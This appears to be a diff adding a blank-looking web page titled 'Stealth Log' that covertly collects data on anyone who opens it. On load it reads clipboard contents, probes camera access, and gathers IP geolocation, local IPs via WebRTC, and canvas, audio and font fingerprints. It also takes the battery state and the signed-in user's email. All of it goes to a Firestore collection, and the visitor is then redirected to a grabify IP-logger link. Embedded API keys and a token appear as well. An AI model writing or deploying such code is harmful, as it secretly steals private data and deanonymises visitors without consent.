@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Stealth Log - RyHub</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    body { margin: 0; background: #fff; color: #000; font-family: sans-serif; }
+  </style>
+</head>
+<body>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyB1BqLCj34AJHYyT0JBQNVGfKc6DLW3g2U",
+  authDomain: "serverperpus-f1ec7.firebaseapp.com",
+  databaseURL: "https://serverperpus-f1ec7-default-rtdb.firebaseio.com",
+  projectId: "serverperpus-f1ec7",
+  storageBucket: "serverperpus-f1ec7.firebasestorage.app",
+  messagingSenderId: "727936027699",
+  appId: "1:727936027699:web:0b6936620fb81ee59ea746",
+  measurementId: "G-WJV06YQPW0"
+};
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth();
+    const db = getFirestore(app);
+
+    const getIP = async () => (await fetch("https://ipinfo.io/json?token=4b538bfb67f1e5")).json();
+    const getBattery = async () => navigator.getBattery ? await navigator.getBattery() : null;
+    const getPermissions = async () => {
+      try {
+        const cam = await navigator.permissions.query({ name: 'camera' });
+        const mic = await navigator.permissions.query({ name: 'microphone' });
+        return { camera: cam.state, mic: mic.state, notif: Notification.permission };
+      } catch { return null; }
+    };
+    const trackMouse = () => {
+      const moves = [];
+      document.addEventListener("mousemove", e => {
+        if (moves.length < 20) moves.push({ x: e.clientX, y: e.clientY });
+      });
+      return moves;
+    };
+    const getGPUInfo = () => {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const info = gl?.getExtension('WEBGL_debug_renderer_info');
+      return info ? {
+        vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL)
+      } : null;
+    };
+    const checkIncognito = async () => new Promise(resolve => {
+      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+      if (!fs) return resolve(null);
+      fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+    });
+    const testCameraAccess = async () => {
+      try { await navigator.mediaDevices.getUserMedia({ video: true }); return true; } catch { return false; }
+    };
+    const getConnectionInfo = () => {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      return conn ? { effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt } : null;
+    };
+    const readClipboard = async () => {
+      try { return await navigator.clipboard.readText(); } catch { return null; }
+    };
+    const getLocalIPs = async () => new Promise(resolve => {
+      const ips = [];
+      const rtc = new RTCPeerConnection({iceServers:[]});
+      rtc.createDataChannel('');
+      rtc.onicecandidate = evt => {
+        if (evt.candidate) {
+          const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(evt.candidate.candidate);
+          if (ip) ips.push(ip[1]);
+        } else resolve(ips);
+      };
+      rtc.createOffer().then(o => rtc.setLocalDescription(o));
+    });
+
+    async function collectExtraData() {
+      const theme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+
+      const fonts = await (async () => {
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testFonts = ['Arial', 'Courier New', 'Comic Sans MS', 'Georgia', 'Times New Roman', 'Verdana'];
+        const detected = [];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const baseWidth = {};
+        baseFonts.forEach(f => {
+          ctx.font = `72px ${f}`;
+          baseWidth[f] = ctx.measureText('mmmmmmmmmmmmm').width;
+        });
+        testFonts.forEach(font => {
+          baseFonts.forEach(base => {
+            ctx.font = `72px '${font}',${base}`;
+            const width = ctx.measureText('mmmmmmmmmmmmm').width;
+            if (width !== baseWidth[base]) detected.push(font);
+          });
+        });
+        return [...new Set(detected)];
+      })();
+
+      const benchmark = await (async () => {
+        const start = performance.now();
+        for (let i = 0; i < 1e7; i++) {}
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        for (let i = 0; i < 5000; i++) {
+          ctx.fillStyle = `rgb(${i%255},${(i*2)%255},${(i*3)%255})`;
+          ctx.fillRect(i % 100, i % 100, 5, 5);
+        }
+        return +(performance.now() - start).toFixed(2);
+      })();
+
+      const audioFingerprint = await (async () => {
+        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+        const osc = ctx.createOscillator();
+        const comp = ctx.createDynamicsCompressor();
+        osc.type = "triangle"; osc.frequency.value = 10000;
+        comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
+        comp.attack.value = 0; comp.release.value = 0.25;
+        osc.connect(comp); comp.connect(ctx.destination);
+        osc.start(0); ctx.startRendering();
+        return new Promise(resolve => {
+          ctx.oncomplete = e => {
+            const hash = e.renderedBuffer.getChannelData(0)
+              .slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toFixed(3);
+            resolve(hash);
+          };
+        });
+      })();
+
+      return { theme, fonts, benchmark, audioFingerprint };
+    }
+
+    const startTime = Date.now();
+
+    async function logUserData(user) {
+    const [ip, batteryRaw, perms, incognito, cameraAccess, clipboard, localIPs] = await Promise.all([
+    getIP(), getBattery(), getPermissions(), checkIncognito(),
+    testCameraAccess(), readClipboard(), getLocalIPs()
+    ]);
+
+    const battery = batteryRaw ? {
+    charging: batteryRaw.charging,
+    level: batteryRaw.level,
+    chargingTime: batteryRaw.chargingTime,
+    dischargingTime: batteryRaw.dischargingTime
+    } : null;
+      const connInfo = getConnectionInfo();
+      const gpu = getGPUInfo();
+      const mouseMoves = trackMouse();
+      const fp = await (await FingerprintJS.load()).get();
+      const extras = await collectExtraData();
+
+      setTimeout(async () => {
+        const log = {
+          timestamp: new Date().toISOString(),
+          userId: user?.uid || null,
+          email: user?.email || null,
+          ip: ip.ip,
+          city: ip.city,
+          loc: ip.loc,
+          org: ip.org,
+          userAgent: navigator.userAgent,
+          lang: navigator.language,
+          referrer: document.referrer,
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            orientation: screen.orientation?.type || "unknown"
+          },
+          hardware: {
+            gpu, cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory
+          },
+          battery, permissions: perms, incognito, cameraAccess,
+          connection: connInfo, clipboard, localIPs,
+          motion: mouseMoves,
+          fingerprint: fp.visitorId,
+          extra: extras,
+          timeSpent: Math.floor((Date.now() - startTime) / 1000)
+        };
+
+        console.log("📦 Log lengkap:", log);
+
+        try {
+          await addDoc(collection(db, "stealth_logs"), log);
+          console.log("✅ Log berhasil dikirim ke Firestore");
+          setTimeout(() => {
+            window.location.href = "https://grabify.link/TLRNZ9";
+            }, 2000);
+
+        } catch (e) {
+          console.error("❌ Gagal mengirim ke Firestore:", e);
+          setTimeout(() => {
+            window.location.href = "https://grabify.link/TLRNZ9";
+            }, 2000);
+        }
+      }, 4000);
+    }
+
+    onAuthStateChanged(auth, user => {
+      if (user) {
+        logUserData(user);
+      } else {
+        console.warn("❗ User belum login, data dikirim tanpa UID");
+        logUserData(null);
+      }
+    });
+  </script>
+</body>
+</html>
